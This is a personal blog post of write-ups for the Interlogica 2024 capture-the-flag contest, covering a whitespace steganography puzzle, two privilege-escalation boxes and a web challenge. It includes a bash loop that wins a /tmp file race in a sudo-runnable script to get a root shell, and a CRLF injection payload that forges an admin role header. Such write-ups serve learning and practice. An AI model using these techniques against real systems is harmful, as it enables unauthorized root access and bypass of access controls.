---
title: my writeups for interlogica ctf 2024
categories:
  - ctf
tags:
  - interlogica 2024
  - fullpwn
  - stego
  - web
pin: true
image:
  path: /assets/img/Wastelands_participation_certificate_8th_place.png
  alt: wastelangs participation cert
published: true
---

# prologue & review

overall really great ctf, however some useless guessing was involved that really made some challenges look stupid. Aside of that the concept is great and i loved it!

We could have done better, but unfortunately i didn't have much time for solving the challenges due to some obligations and i only solved 4 challs.

anyways i'm pretty happy of the result! Luckily my teammates managed to get some more flags!

# stego
## gifts of the present

this seemed like a normal png file representing a pile of trash

![img](https://n1kkogg.github.io/assets/img/giftsofthepresent.png)

but after some investigation on https://www.aperisolve.com/

i found out thx to pngcheck that there was some additional data after the IEND chunk (the end of the png).

i copied the raw bytes and found out that it was about tabs newline and spaces... I immediately tought of some whitespace encoding due to some challenge in the past that had the same encoding. And in fact it was!

```
0d0a09200909202020090d0a09200920092009090d0a0920092009092009
0d0a09200909202009090d0a09200909092020200d0a0920090909092020
0d0a09202020200920200d0a09202009090920200d0a0909202009090909
0d0a09202020090920090d0a09202009202020090d0a0920202009200920
0d0a09202009090920200d0a09092020090909090d0a0920202009090909
0d0a09202009200909200d0a09202009090909200d0a0920202020200920
```
as you can see it seems like 0d0a is used as a separator here, let's make that clear

```
0d0a0920090920202009
0d0a0920092009200909
0d0a0920092009092009
0d0a0920090920200909
0d0a0920090909202020
0d0a0920090909092020
0d0a0920202020092020
0d0a0920200909092020
0d0a0909202009090909
0d0a0920202009092009
0d0a0920200920202009
0d0a0920202009200920
0d0a0920200909092020
0d0a0909202009090909
0d0a0920202009090909
0d0a0920200920090920
0d0a0920200909090920
0d0a0920202020200920
```

i found a website that lets me decode it https://naokikp.github.io/wsi/whitespace.html

it was a bit slow tho, so i asked chatgpt to write a script for me

```python
def decode_hex_whitespace_cipher(hex_cipher):
    # Convert hex to corresponding whitespace characters
    whitespace_cipher = hex_cipher.replace('09', '\t').replace('20', ' ')
    
    # Replace whitespace characters with '0' and '1'
    binary_string = whitespace_cipher.replace('\t', '0').replace(' ', '1')
    
    # Split the binary string into chunks of 8 bits
    n = 8
    binary_chunks = [binary_string[i:i + n] for i in range(0, len(binary_string), n)]
    
    # Convert each binary chunk to an ASCII character
    decoded_characters = [chr(int(chunk, 2)) for chunk in binary_chunks]
    
    # Join the characters to form the decoded string
    decoded_string = ''.join(decoded_characters)
    
    return decoded_string

# Example usage:
hex_cipher = "092009092020200909200920092009090920092009092009092009092020090909200909092020200920090909092020092020202009202009202009090920200909202009090909092020200909200909202009202020090920202009200920092020090909202009092020090909090920202009090909092020092009092009202009090909200920202020200920" 
decoded_message = decode_hex_whitespace_cipher(hex_cipher)
print(decoded_message)
```

and i got the flag!

`NTRLGC{c0rnuc0pia}`


# fullpwn
## mechore

these two challenges were very similar, basically equal

to solve this we have to login to the ssh server with mechore:mechore

upon loggin in we are asked to get the flag which is probably in the /root folder

thx to `sudo -l` i found out that we could run this script here

`(ALL) NOPASSWD: /usr/bin/python3 /home/warmachine/startup.py`

```python
#!/usr/bin/env python3

import os
import subprocess

from modules import motion_subsystem, weapons_subsystem, diagnostics_subsystem


def opener(path, flags):
    return os.open(path, flags, 0o666)


def main():
    os.umask(0)
    with open("/tmp/mode", "w", opener=opener) as f:
        f.write("IDLE")

    print("Starting up system")

    initialization_count = 0
    expected_initializations = 5
    success = motion_subsystem.initialize()
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = diagnostics_subsystem.initialize()
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = weapons_subsystem.initialize('gatling')
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = weapons_subsystem.initialize('laser')
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = weapons_subsystem.initialize('missiles')
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    if initialization_count == 0:
        print("NO COMPONENTS LOADED CORRECTLY")
    elif initialization_count < expected_initializations:
        print(f"LOADING FAILED FOR {expected_initializations - initialization_count} MODULES.")
    else:
        print("ALL COMPONENTS LOADED CORRECTLY")

    print("Waiting for MAINTENANCE MODE ..")

    with open("/tmp/mode", "r") as f:
        mode = f.read().strip()

    if mode == "COMBAT":
        print("No weapon system detected")
        print("Cannot initiate combat mode")
    elif mode == "IDLE":
        print("System in stand-by.")
        return
    elif mode == "MAINTENANCE":
        print("System in maintenance mode.")
        print("Waiting for command.")
        subprocess.call(["/bin/bash"])
    else:
        print("Unknown mode detected.")


if __name__ == "__main__":
    main()
```

which is vulnerable to a race condition on open().

because as you can see the function is ran two times, one at the start of the file to input the default setting and one at the end to get the mode.

altough this python file is fast in execution there is a small time frame where we can exploit this race condition, which will eventually work after a bit of luck

here's the simple bash script i used to exploit it:

```bash
#!/bin/bash

while true; do
  echo "MAINTENANCE" > /tmp/mode
done
```
we can start this in a new process, and eventually after two or three times it worked and i got root!


`NTRLGC{The_f4st3r_mecH_1n_c0mb4t}`


## warmachine
this one had the same exact vulnerability
`sudo -l`

`(ALL) NOPASSWD: /usr/bin/python3 /home/mechcore/startup.py`


```python
#!/usr/bin/env python3

import os
import subprocess
import time

from modules import motion_subsystem, weapons_subsystem, diagnostics_subsystem


def opener(path, flags):
    return os.open(path, flags, 0o666)


def main():
    os.umask(0)
    with open("/tmp/mode", "w", opener=opener) as f:
        f.write("COMBAT")

    initialization_count = 0
    expected_initializations = 5
    success = motion_subsystem.initialize()
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = diagnostics_subsystem.initialize()
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = weapons_subsystem.initialize('gatling')
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = weapons_subsystem.initialize('laser')
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    success = weapons_subsystem.initialize('missiles')
    if success:
        initialization_count += 1
        print('SUCCESS')
    else:
        print('FAILED')

    if initialization_count == 0:
        print("NO COMPONENTS LOADED CORRECTLY")
    elif initialization_count < expected_initializations:
        print(f"LOADING FAILED FOR {expected_initializations - initialization_count} MODULES.")
    else:
        print("ALL COMPONENTS LOADED CORRECTLY")

    print("Starting warmachine mode ..")

    with open("/tmp/mode", "r") as f:
        mode = f.read().strip()

    if mode == "COMBAT":
        print("Initiated combat mode.")
        print("Enemy nearby detected.")
        print("Engaging combat.")
        subprocess.call("/usr/local/bin/killenemies")
    elif mode == "IDLE":
        print("System in stand-by.")
        while True:
            time.sleep(0.1)
    elif mode == "MAINTENANCE":
        print("System in maintenance mode.")
        print("Waiting for command.")
        subprocess.call(["/bin/bash"])
    else:
        print("Unknown mode detected.\nInitiating self destruction in 3.. 2.. 1..")
        subprocess.call("/usr/local/bin/killenemies")


if __name__ == "__main__":
    main()
```

it was just a little more aggressive than the other one because it kicked you out of ssh at every failed attempt, but after two times it worked like a charm with the same exact script.

`NTRLGC{Th3_f4st3s7_meCh_in_th3_w4r}`

# web
## unauthorized

this challenge didnt have many solves and i felt pretty good after solving it, it was about a CRLF injection on a logging page

![img](https://n1kkogg.github.io/assets/img/unauthorizedchall.png)

when you tried to send a username like guest it would send a get request with parameter to /verify

`http://10.69.1.11:5100/verify?username=1234`

like this

and it would be logged in a page called /status that i found while dirbusting

`http://10.69.1.11:5100/status`

```
ROLE
----
[none] Unauthorized

LOGS
----
2024-07-08 11:15:09,190 - INFO -
Server: BaseHTTP/0.6 Python/3.9.19
Date: Mon, 08 Jul 2024 11:15:09 GMT
Content-type: text/html

2024-07-08 11:15:09,458 - INFO -
Server: BaseHTTP/0.6 Python/3.9.19
Date: Mon, 08 Jul 2024 11:15:09 GMT
Content-type: image/png

2024-07-08 11:15:09,616 - INFO -
Server: BaseHTTP/0.6 Python/3.9.19
Date: Mon, 08 Jul 2024 11:15:09 GMT
Content-type: image/vnd.microsoft.icon

2024-07-08 11:15:13,442 - INFO -
Server: BaseHTTP/0.6 Python/3.9.19
Date: Mon, 08 Jul 2024 11:15:13 GMT
Content-type: text/plain
X-Role: none
X-Username: 1231

2024-07-08 11:17:59,686 - INFO -
Server: BaseHTTP/0.6 Python/3.9.19
Date: Mon, 08 Jul 2024 11:17:59 GMT
Content-type: text/plain
X-Role: none
X-Username: 1231
```

after some basic enumeration i decided to inject some newlines to see how they worked inside the page. And it seemed like they were injecting successfully.

To exploit this bug i simply injected a new X-Role with the admin role and hoped for the best, and it actually worked!

`%0aX-Role%3a+admin`

```
ROLE
----
[admin] Access granted. Auth Link: /verify/auth/b54809755c600191a7eb56f625e53712 
```

`NTRLGC{L3T5_5PL1T_TH15!}`

# prologue

that's it! thank you for reading!